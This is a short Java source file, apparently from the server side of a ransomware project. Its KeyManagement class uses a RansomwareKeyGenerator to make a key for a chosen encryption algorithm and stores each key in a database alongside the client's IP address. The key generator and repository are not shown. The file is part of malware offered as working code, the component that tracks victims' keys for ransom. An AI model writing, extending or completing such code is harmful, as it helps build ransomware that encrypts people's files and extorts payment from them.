package server.keys;

import javax.inject.Inject;

import server.repositories.KeyRepository;
import server.entities.CryptoKey;

public class KeyManagement {
	@Inject
	private KeyRepository repository;

	public <T> T createKey(String encalgo, String ip) {
		RansomwareKeyGenerator<T> clientKey = new RansomwareKeyGenerator<T>();
		T key = (T) clientKey.generateKey(encalgo);
		save(new CryptoKey<T>(ip, key, encalgo)); // Save to DB
		return (T) key;

	}

	public void save(CryptoKey entity) {
		repository.save(entity);

	}

}
